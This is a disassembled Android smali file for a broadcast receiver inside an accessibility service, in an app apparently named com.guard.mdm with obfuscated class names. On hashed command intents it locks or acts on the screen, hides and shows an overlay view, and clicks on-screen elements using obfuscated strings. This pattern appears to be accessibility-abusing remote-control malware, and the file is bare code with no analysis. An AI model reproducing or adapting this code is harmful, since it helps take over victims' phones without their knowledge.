.class Lcom/guard/mdm/Becklespinax$1;
.super Landroid/content/BroadcastReceiver;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/guard/mdm/Becklespinax;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/guard/mdm/Becklespinax;


# direct methods
.method public constructor <init>(Lcom/guard/mdm/Becklespinax;)V
    .registers 2

    iput-object p1, p0, Lcom/guard/mdm/Becklespinax$1;->this$0:Lcom/guard/mdm/Becklespinax;

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 7

    if-eqz p2, :cond_91

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    if-eqz p1, :cond_91

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result p1

    if-nez p1, :cond_91

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result p1

    const v0, -0x6c0d0af4

    const/16 v1, 0x8

    if-ne p1, v0, :cond_2a

    iget-object p0, p0, Lcom/guard/mdm/Becklespinax$1;->this$0:Lcom/guard/mdm/Becklespinax;

    invoke-virtual {p0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto :goto_91

    :cond_2a
    iget-object p1, p0, Lcom/guard/mdm/Becklespinax$1;->this$0:Lcom/guard/mdm/Becklespinax;

    iget-object p1, p1, Lcom/guard/mdm/Becklespinax;->c:Lcom/guard/mdm/k;

    invoke-virtual {p1}, Lcom/guard/mdm/k;->b()Z

    move-result p1

    if-eqz p1, :cond_91

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result p1

    const v0, 0x4458c437

    if-ne p1, v0, :cond_4a

    iget-object p0, p0, Lcom/guard/mdm/Becklespinax$1;->this$0:Lcom/guard/mdm/Becklespinax;

    iget-object p0, p0, Lcom/guard/mdm/Becklespinax;->e:Landroid/view/View;

    const/4 p1, 0x4

    invoke-virtual {p0, p1}, Landroid/view/View;->setVisibility(I)V

    goto :goto_91

    :cond_4a
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result p1

    const v0, -0x3c90d10e

    if-ne p1, v0, :cond_60

    iget-object p0, p0, Lcom/guard/mdm/Becklespinax$1;->this$0:Lcom/guard/mdm/Becklespinax;

    iget-object p0, p0, Lcom/guard/mdm/Becklespinax;->e:Landroid/view/View;

    const/4 p1, 0x0

    invoke-virtual {p0, p1}, Landroid/view/View;->setVisibility(I)V

    goto :goto_91

    :cond_60
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result p1

    const p2, 0x4a505e35    # 3413901.2f

    if-ne p1, p2, :cond_91

    iget-object p0, p0, Lcom/guard/mdm/Becklespinax$1;->this$0:Lcom/guard/mdm/Becklespinax;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    if-nez p1, :cond_76

    goto :goto_91

    :cond_76
    invoke-static {}, Lcom/guard/Aardonyx/a;->f()[Ljava/lang/String;

    move-result-object p2

    const/4 v0, 0x7

    aget-object v0, p2, v0

    invoke-static {p1, v0}, Lcom/guard/mdm/Becklespinax;->a(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Lcom/guard/mdm/Becklespinax;->d(J)V

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-nez p0, :cond_8c

    goto :goto_91

    :cond_8c
    aget-object p1, p2, v1

    invoke-static {p0, p1}, Lcom/guard/mdm/Becklespinax;->a(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    :cond_91
    :goto_91
    return-void
.end method
